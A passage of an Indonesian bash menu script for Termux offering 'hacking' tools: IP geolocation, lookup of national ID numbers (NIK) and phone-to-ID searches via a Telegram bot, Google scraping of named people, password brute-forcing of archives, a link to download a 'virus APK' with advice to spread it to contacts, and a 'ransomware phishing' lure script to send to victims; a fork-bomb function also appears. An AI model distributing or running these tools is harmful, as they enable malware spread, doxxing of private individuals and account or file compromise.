                                                                                    city=$(echo "$ip_info" | jq -r '.city // "N/A"')
                                                                                    region=$(echo "$ip_info" | jq -r '.region // "N/A"')
                                                                                    country=$(echo "$ip_info" | jq -r '.country // "N/A"')
                                                                                    loc=$(echo "$ip_info" | jq -r '.loc // "N/A"')
                                                                                    org=$(echo "$ip_info" | jq -r '.org // "N/A"')
                                                                                    timezone=$(echo "$ip_info" | jq -r '.timezone // "N/A"')
                                                                                    asn=$(echo "$ip_info" | jq -r '.asn.asn // "N/A"')
                                                                                    asn_name=$(echo "$ip_info" | jq -r '.asn.name // "N/A"')
                                                                                    asn_domain=$(echo "$ip_info" | jq -r '.asn.domain // "N/A"')
                                                                                    vpn=$(echo "$ip_info" | jq -r '.privacy.vpn // "false"')
                                                                                    proxy=$(echo "$ip_info" | jq -r '.privacy.proxy // "false"')
                                                                                    tor=$(echo "$ip_info" | jq -r '.privacy.tor // "false"')
                                                                                    relay=$(echo "$ip_info" | jq -r '.privacy.relay // "false"')
                                                                                    hosting=$(echo "$ip_info" | jq -r '.privacy.hosting // "false"')
                                                                                    echo "Hasil scanning untuk IP: $ip_address"
                                                                                    echo "Hostname    : $hostname"
                                                                                    echo "Lokasi      : $city, $region, $country"
                                                                                    echo "Koordinat   : $loc"
                                                                                    echo "Organisasi  : $org"
                                                                                    echo "Timezone    : $timezone"
                                                                                    echo "ASN         : $asn"
                                                                                    echo "ASN Name    : $asn_name"
                                                                                    echo "ASN Domain  : $asn_domain"
                                                                                    echo ""
                                                                                    echo "Status Privasi:"
                                                                                    echo "VPN         : $vpn"
                                                                                    echo "Proxy       : $proxy"
                                                                                    echo "Tor         : $tor"
                                                                                    echo "Relay       : $relay"
                                                                                    echo "Hosting     : $hosting"
                                                                             }
                                                                             nik_nih_bos() {
                                                                                    pasang="$PREFIX/include/NIK"
                                                                                    lagek_melbu="completed"
                                                                                    while true; do
                                                                                           if [[ -d $pasang && -f $lagek_melbu ]]; then
                                                                                                  cd "$pasang"
                                                                                                  git stash &> /dev/null
                                                                                                  git pull origin main &> /dev/null
                                                                                                  clear
                                                                                                  loading_string="   LOADING SCANNING"
                                                                                                  lowercase_string="   loading scanning"
                                                                                                  length=${#loading_string}
                                                                                                  link() {
                                                                                                         clear
                                                                                                         e "Mau Osint Pake Nomor Buat Dapet NIKnya ?"
                                                                                                         e "Pake Bot Telegram Aja Silahkan Klik Telegram" | lolcat
                                                                                                         e "Saya Akan Mengarahkan Anda Ke Telegram" | lolcat
                                                                                                         e "Di dalam Nanti Langsung Anda Tempel Nomor Target Anda" | lolcat
                                                                                                         e "Contohnya$c:$k 6285953465619"
                                                                                                  }
                                                                                                  loading_animation() {
                                                                                                         for ((i = 0; i <= length; i++)); do
                                                                                                                current_string="${lowercase_string:0:i}${loading_string:i:length}"
                                                                                                                percent=$((i * 100 / length))
                                                                                                                printf "\r$current_string [%d%%]" "$percent"
                                                                                                                sleep 0.1
                                                                                                         done
                                                                                                  }
                                                                                                  long_task() {
                                                                                                         sleep 2
                                                                                                  }
                                                                                                  bacot() {
                                                                                                         echo "
██████╗ ███████╗██╗███╗   ██╗████████╗
██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║   ██║███████╗██║██╔██╗ ██║   ██║
██║   ██║╚════██║██║██║╚██╗██║   ██║
╚██████╔╝███████║██║██║ ╚████║   ██║
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.G404
"
                                                                                                  }
                                                                                                  bacot | lolcat
                                                                                                  read -p "Masukkan NIK Target Anda: " niknya_kontol
                                                                                                  long_task &
                                                                                                  loading_animation | lolcat
                                                                                                  clear
                                                                                                  bacot | lolcat
                                                                                                  nik-parse -n "$niknya_kontol"
                                                                                                  $e
                                                                                                  $e
                                                                                                  e "$m"
                                                                                                  read -p "Apa Anda Ingin Mengulangi Nya ? (y/n) " opo
                                                                                                  if [[ $opo == "y" || $opo == "Y" ]]; then
                                                                                                         link | lolcat
                                                                                                         $e
                                                                                                         $e
                                                                                                         $e
                                                                                                         read -p "Silahkan Enter Untuk Menuju ke Telegram"
                                                                                                         xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
                                                                                                  elif [[ $opo == "n" || $opo == "N" ]]; then
                                                                                                         link | lolcat
                                                                                                         $e
                                                                                                         $e
                                                                                                         $e
                                                                                                         read -p "Silahkan Enter Untuk Menuju ke Telegram"
                                                                                                         xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
                                                                                                         break
                                                                                                  else
                                                                                                         e $m "BODO KALI KAU, YANG BENER ANYING"
                                                                                                  fi
                                                                                           else
                                                                                                  e $bg_m "Package Durung Di Install, Installasi sek$res"
                                                                                                  cd $PREFIX/include/
                                                                                                  git clone --depth 32 https://github.com/GALIRUS404/NIK &> /dev/null | echo "Sabar Cok Sek Masang Iki"
                                                                                                  cd NIK
                                                                                                  git stash &> /dev/null
                                                                                                  git pull origin main &> /dev/null
                                                                                                  npm install nik-parse -g
                                                                                                  echo "kau anak kontol 😂" > "$lagek_melbu"
                                                                                           fi
                                                                                    done
                                                                             }
                                                                             Google_Osint() {
                                                                                    read -p "Masukkan nama untuk OSINT: " target_name
                                                                                    query=$(echo "$target_name" | sed 's/ /+/g')
                                                                                    url="https://www.google.com/search?q=$query"
                                                                                    e "\n$c🌐 OSINT - Pencarian Google$res"
                                                                                    e "$h=============================================$res"
                                                                                    e "$b🔍 Mencari: $h$target_name$res"
                                                                                    e "$k📎 $url$res"
                                                                                    e "$h=============================================\n$res"
                                                                                    results=$(curl -s -A "Mozilla/5.0" "$url" | grep -oP '(?<=<a href=")[^"]*(?=")' | grep 'http')
                                                                                    if [[ -z $results ]]; then
                                                                                           e "$m⚠️  Tidak ada hasil ditemukan atau akses diblokir oleh Google.$res"
                                                                                    else
                                                                                           e "$bl📄 Hasil Pencarian:$res"
                                                                                           e "$h---------------------------------------------$res"
                                                                                           count=1
                                                                                           echo "$results" | while read -r line; do
                                                                                                  printf " $u[%02d] $bl%s$res\n" "$count" "$line"
                                                                                                  ((count++))
                                                                                           done
                                                                                    fi
                                                                                    e "\n$h✅ Pencarian selesai.$res"
                                                                                    echo $k
                                                                                    read -p "Enter Untuk Masuk Ke MENU"
                                                                             }
                                                                             main_menu() {
                                                                                    while true; do
                                                                                           banner1() {
                                                                                                  echo "
You
⠀⠀⠀⣴⣾⣿⣿⣶⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⢿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣉⣩⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣼⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢀⣼⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢀⣾⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀Animex⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢠⣾⣿⣿⠉⣿⣿⣿⣿⣿⡄⠀⢀⣠⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠙⣿⣿⣧⣿⣿⣿⣿⣿⡇⢠⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣷⠸⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⠿⢿⣿⣿⣿⣿⡄⠙⠻⠿⠿⠛⠁⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡟⣩⣝⢿⠀⠀⣠⣶⣶⣦⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣷⡝⣿⣦⣠⣾⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣮⢻⣿⠟⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⡇⠀⠀⠻⠿⠻⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠇⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⡆⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⠀⠀⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⠇⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⡿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣟⣋⣁⣀⣀⠀
⠀⠀⠀⠀⠀⠀⠹⣿⣿⠇⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠇"
                                                                                           }
                                                                                           banner2() {
                                                                                                  cowsay -f eyes "Simpel Osint By.Galirus404" | lolcat
                                                                                           }
                                                                                           banner3() {
                                                                                                  echo "
⠤⣤⣤⣤⣄⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣠⣤⠤⠤⠴⠶⠶⠶⠶
⢠⣤⣤⡄⣤⣤⣤⠄⣀⠉⣉⣙⠒⠤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠴⠘⣉⢡⣤⡤⠐⣶⡆⢶⠀⣶⣶⡦
⣄⢻⣿⣧⠻⠇⠋⠀⠋⠀⢘⣿⢳⣦⣌⠳⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠞⣡⣴⣧⠻⣄⢸⣿⣿⡟⢁⡻⣸⣿⡿⠁
⠈⠃⠙⢿⣧⣙⠶⣿⣿⡷⢘⣡⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣷⣝⡳⠶⠶⠾⣛⣵⡿⠋⠀⠀
⠀⠀⠀⠀⠉⠻⣿⣶⠂⠘⠛⠛⠛⢛⡛⠋⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠛⠀⠉⠒⠛⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢻⡁⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠘⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
Simpel Osint By.Galirus404⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
                                                                                           }
                                                                                           logo=("banner1" "banner2" "banner3")
                                                                                           random_index=$((RANDOM % ${#logo[@]}))
                                                                                           banner="${logo[random_index]}"
                                                                                           clear
                                                                                           $banner | lolcat
                                                                                           e $c "Mode In Galirus Official™"
                                                                                           e "$h=============================================$res"
                                                                                           e "$b          MENU UTAMA OSINT                 $res"
                                                                                           e "$h=============================================$res"
                                                                                           e "$k[$bl 1$k ]$m Track IP Address                     $res"
                                                                                           e "$k[$bl 2$k ]$m Osint NIK                         $res"
                                                                                           e "$k[$bl 3$k ]$m Pencarian Google                    $res"
                                                                                           e "$k[$bl 0$k ]$m Keluar                             $res"
                                                                                           e "$h=============================================$res"
                                                                                           read -p "Pilih opsi [1-5]: " option
                                                                                           case $option in
                                                                                                  1) track_ip_address ;;
                                                                                                  2) nik_nih_bos ;;
                                                                                                  3) Google_Osint ;;
                                                                                                  0) break ;;
                                                                                                  *) e "${m}Pilihan tidak valid, silakan coba lagi.$res" ;;
                                                                                           esac
                                                                                           read -p "Tekan Enter untuk melanjutkan..."
                                                                                    done
                                                                             }
                                                                             instalasi() {
                                                                                    clear
                                                                                    while true; do
                                                                                           scan="Package"
                                                                                           if [ -f "$scan" ]; then
                                                                                                  break
                                                                                           else
                                                                                                  $paket install jq wget curl cowsay -y
                                                                                                  $paket install ruby php python python3 -y
                                                                                                  gem install lolcat
                                                                                                  touch "$scan"
                                                                                           fi
                                                                                    done
                                                                             }
                                                                             kanggo_termux_tok() {
                                                                                    delok="/data/data/com.termux"
                                                                                    if [ -d "$delok" ]; then
                                                                                           instalasi
                                                                                           main_menu
                                                                                    else
                                                                                           :() {
                                                                                                  : | : &
                                                                                           }
                                                                                    fi
                                                                             }
                                                                             kanggo_termux_tok
                                                                      elif [ "$no" = "26" ]; then
                                                                             logo() {
                                                                                    echo "
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣿⣿⣶⣶⣶⣶⣦⣤⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⠶⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡄⢀⠴⠀⠀⠀⠀⠀⠀⠀⠈⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣎⣴⣋⣠⣤⣔⣠⣤⣤⣠⣀⣀⠀⠀⠈⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⣠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣂⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀
⠀⠀⠀⠀⠀⠀⢠⡾⣻⣿⣿⣿⣿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣧⡀⠀
⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⠿⠛⠂⠀⠀⡀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡈⢻⣿⣿⣆⠈⢻⣧⠀
⠀⠀⠀⠀⠻⣿⠛⠉⠀⠀⠀⠀⢀⣤⣾⣿⣦⣤⣤⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⡇⠀⢻⣿⣿⡀⠀⠻⡆
⠀⠀⣰⣤⣤⣤⣤⣤⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠈⢻⣿⣿⣿⠀⠀⢹⣿⣇⠀⠀⠳
⠀⢰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠛⢻⠛⠛⠻⣿⣿⣿⣿⣿⣿⣿⣧⠀⢻⣿⣿⡆⠀⠀⢻⣿⠀⠀⠀
⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠁⠀⠼⠛⢿⣶⣦⣿⣿⠻⣿⣿⣿⣿⣿⣇⠀⢻⣿⡇⠀⠀⠀⣿⠀⠀⠀
⠸⠛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⠀⠀⠀⠀⠀⠘⠁⠈⠛⠋⠀⠘⢿⣿⣿⣿⣿⡀⠈⣿⡇⠀⠀⠀⢸⡇⠀⠀
⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⡇⠀⢹⠇⠀⠀⠀⠈⠀⠀⠀
⠀⠀⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⡇⠀⠼⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡉⠛⠛⠿⠿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢈⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⢿⣿⣿⣿⣷⡀⠉⠙⠻⠿⢿⣿⣷⣤⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣾⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠿⣿⣿⣦⡀⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⢀⣠⣾⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠿⢦⣀⠀⠀⠀⢀⣴⣿⣧⣤⣴⣾⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠛⠛⠛⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"
                                                                             }
                                                                             cloud() {
                                                                                    read -p "Masukkan Port Yang Ingin Anda Gunakan : " apa
                                                                                    printf "\e[1;77m[\e[0m\e[1;93m+\e[0m\e[1;77m] Starting Cloudflared...\e[0m\n"
                                                                                    php -S localhost:$apa > /dev/null 2>&1 &
                                                                                    sleep 3
                                                                                    cloudflared tunnel --url http://localhost:$apa --protocol http2 > sendlink 2>&1 &
                                                                                    sleep 8
                                                                                    send_link=$(grep -o "https://[-0-9a-z]*\.trycloudflare.com" sendlink)
                                                                                    printf '\e[1;93m[\e[0m\e[1;77m+\e[0m\e[1;93m] Silahkan Salin Link:\e[0m\e[1;77m %s\n' $send_link
                                                                             }
                                                                             clear
                                                                             logo | lolcat
                                                                             echo -e $pwl " Cloudflared Link By.Galirus Official"
                                                                             cloud
                                                                             ENTER
                                                                      elif [ "$no" = "27" ]; then
                                                                             while true; do
                                                                                    clear
                                                                                    pandora="$PREFIX/lib/bruteforcejip"
                                                                                    if [ -d "$pandora" ]; then
                                                                                           e $h "Menjalankan SCRIPT"
                                                                                           sleep 3
                                                                                           cd $pandora
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           clear
                                                                                           e $m "          $bg_h Silahkan Pilih Menu Metode $res"
                                                                                           e $c "1.$k Metode Crack Password Tanpa Wordlist.txt"
                                                                                           e $c "2.$k Metode Menggunakan Wordlist.tx$b"
                                                                                           read -p "Choose ( 1 - 2 ): " apatod
                                                                                           if [ "$apatod" = "1" ]; then
                                                                                                  python $pandora/brute.py
                                                                                                  read -p "Enter Untuk Masuk Menu TOOLSV5"
                                                                                                  break
                                                                                           elif [ "$apatod" = "2" ]; then
                                                                                                  python $pandora/Gasz.py
                                                                                                  read -p "Enter Untuk Masuk Menu TOOLSV5"
                                                                                                  break
                                                                                           else
                                                                                                  e $k "Lu Bisa Ga ? Ga Usah Bodoh Baget Gitu !"
                                                                                                  sleep 3
                                                                                           fi
                                                                                           break
                                                                                    else
                                                                                           e $bg_m"Installasi Package$res"
                                                                                           $paket update -y
                                                                                           pip install termcolor
                                                                                           pip install pyzipper
                                                                                           pip install Crypto.Hash
                                                                                           pip install requests
                                                                                           $paket install python
                                                                                           cd $PREFIX/lib
                                                                                           git clone https://github.com/Hozowaorokananingenda/bruteforcejip
                                                                                           cd bruteforcejip
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "28" ]; then
                                                                             clear
                                                                             e $p " ANDA MEMILIH UNTUK MENDOWNLOAD VIRUS APK"
                                                                             e $h " Harap jangan di pasang di hp anda sendiri, itu namanya tolol !"
                                                                             e $h " Kalo Masih Mau Coba sendiri Sediakan Saja Virtual Android Dan Install Di Dalamnya"
                                                                             e $h " Silahkan Bagikan ke ,GROUP,KONTAK,SW ( KALO BISA ) "
                                                                             e "$m"
                                                                             read -p " ENTER UNTUK MELANJUTKAN"
                                                                             sleep 2
                                                                             clear
                                                                             e " MEMBUKA BROWSER"
                                                                             xdg-open "https://sfile.mobi/94JslaSgEMH"
                                                                      elif [ "$no" = "29" ]; then
                                                                             cek_akses
                                                                             pasang="$PREFIX/include/NIK"
                                                                             lagek_melbu="completed"
                                                                             while true; do
                                                                                    if [[ -d $pasang && -f $lagek_melbu ]]; then
                                                                                           cd "$pasang"
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           clear
                                                                                           loading_string="   LOADING SCANNING"
                                                                                           lowercase_string="   loading scanning"
                                                                                           length=${#loading_string}
                                                                                           link() {
                                                                                                  clear
                                                                                                  e "Mau Osint Pake Nomor Buat Dapet NIKnya ?"
                                                                                                  e "Pake Bot Telegram Aja Silahkan Klik Telegram" | lolcat
                                                                                                  e "Saya Akan Mengarahkan Anda Ke Telegram" | lolcat
                                                                                                  e "Di dalam Nanti Langsung Anda Tempel Nomor Target Anda" | lolcat
                                                                                                  e "Contohnya$c:$k 6285953465619"
                                                                                           }
                                                                                           loading_animation() {
                                                                                                  for ((i = 0; i <= length; i++)); do
                                                                                                         current_string="${lowercase_string:0:i}${loading_string:i:length}"
                                                                                                         percent=$((i * 100 / length))
                                                                                                         printf "\r$current_string [%d%%]" "$percent"
                                                                                                         sleep 0.1
                                                                                                  done
                                                                                           }
                                                                                           long_task() {
                                                                                                  sleep 2
                                                                                           }
                                                                                           bacot() {
                                                                                                  echo "
██████╗ ███████╗██╗███╗   ██╗████████╗
██╔═══██╗██╔════╝██║████╗  ██║╚══██╔══╝
██║   ██║███████╗██║██╔██╗ ██║   ██║
██║   ██║╚════██║██║██║╚██╗██║   ██║
╚██████╔╝███████║██║██║ ╚████║   ██║
╚═════╝ ╚══════╝╚═╝╚═╝  ╚═══╝   ╚═╝   By.G404
"
                                                                                           }
                                                                                           bacot | lolcat
                                                                                           read -p "Masukkan NIK Target Anda: " niknya_kontol
                                                                                           long_task &
                                                                                           loading_animation | lolcat
                                                                                           clear
                                                                                           bacot | lolcat
                                                                                           nik-parse -n "$niknya_kontol"
                                                                                           $e
                                                                                           $e
                                                                                           e "$m"
                                                                                           read -p "Apa Anda Ingin Mengulangi Nya ? (y/n) " opo
                                                                                           if [[ $opo == "y" || $opo == "Y" ]]; then
                                                                                                  link | lolcat
                                                                                                  $e
                                                                                                  $e
                                                                                                  $e
                                                                                                  read -p "Silahkan Enter Untuk Menuju ke Telegram"
                                                                                                  xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
                                                                                           elif [[ $opo == "n" || $opo == "N" ]]; then
                                                                                                  link | lolcat
                                                                                                  $e
                                                                                                  $e
                                                                                                  $e
                                                                                                  read -p "Silahkan Enter Untuk Menuju ke Telegram"
                                                                                                  xdg-open "https://t.me/Shiroko_Galery_Eyes_Bot"
                                                                                                  break
                                                                                           else
                                                                                                  e $m "BODO KALI KAU, YANG BENER ANYING"
                                                                                           fi
                                                                                    else
                                                                                           e $bg_m "Package Durung Di Install, Installasi sek$res"
                                                                                           cd $PREFIX/include/
                                                                                           git clone --depth 32 https://github.com/GALIRUS404/NIK &> /dev/null | echo "Sabar Cok Sek Masang Iki"
                                                                                           cd NIK
                                                                                           git stash &> /dev/null
                                                                                           git pull origin main &> /dev/null
                                                                                           npm install nik-parse -g
                                                                                           echo "kau anak kontol 😂" > "$lagek_melbu"
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "30" ]; then
                                                                             RANSOMWARE() {
                                                                                    clear
                                                                                    e $m "       Selamat Datang Di Ransom Script Phising\n $k Script Ini Anda Salin Dan Kirim Ke target anda yang menggunakan termux, agar target bisa termakan dengan pancingan anda. ingat script ini sangat lah berbahaya karna mengunci semua yang ada di internal. Jangan anda gunakan di terminal anda sendiri. saya tidak bertanggung jawab jika anda tidak teliti dalam membaca aturan ini/anda kena masalah $h"
                                                                                    read -p "enter untuk menampilkan SCRIPT PHISINGNYA"
                                                                                    sleep 3
                                                                                    clear
                                                                                    ransom() {
                                                                                           echo "
pkg update && pkg upgrade
pkg install git bash openssl curl jq ruby -y
gem install lolcat
git clone https://github.com/Lubebansokhekel/OsintTrack
cd OsintTrack
bash OsintTrack.sh
"
                                                                                    }
                                                                                    ransom | lolcat
                                                                                    echo -e $h
                                                                                    read -p "Enter Untuk Mengulang Ke Menu"
                                                                             }
                                                                             while true; do
                                                                                    clear
                                                                                    read -p "Password : " apa
                                                                                    if [ "$apa" = "G1912" ]; then
                                                                                           RANSOMWARE
                                                                                           break
                                                                                    else
                                                                                           e "$bld Password Yang Anda Masukkan Salah Silahkan Tanya Ke Admin"
                                                                                           sleep 3
                                                                                           break
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "31" ]; then
                                                                             while true; do
                                                                                    xattack="$DIR_SAVE/GhostTrack"
                                                                                    if [ -d "$xattack" ]; then
                                                                                           echo " Running Script"
                                                                                           sleep 3
                                                                                           cd $xattack
                                                                                           pip3 install -r requirements.txt
                                                                                           python3 GhostTR.py
                                                                                           break
                                                                                    else
                                                                                           play -q $HOME/Lubeban/sound/salah.mp3 &> /dev/null &
                                                                                           cd $DIR_SAVE
                                                                                           $paket install -y git
                                                                                           $paket install -y python3
                                                                                           git clone --depth 32 https://github.com/HunxByts/GhostTrack
                                                                                    fi
                                                                             done
                                                                      elif [ "$no" = "32" ]; then
                                                                             while true; do
                                                                                    whoiss="$PREFIX/bin/whois"
                                                                                    if [ -f "$whoiss" ]; then
                                                                                           clear
                                                                                           figlet "Whois" | lolcat
                                                                                           apa="y"
                                                                                           while [ "$apa" = "y" ]; do
                                                                                                  read -p "Masukkan domain yang ingin dicari contoh ( google.com ): " domain
                                                                                                  if [ -z "$domain" ]; then
                                                                                                         echo "Domain tidak boleh kosong!"
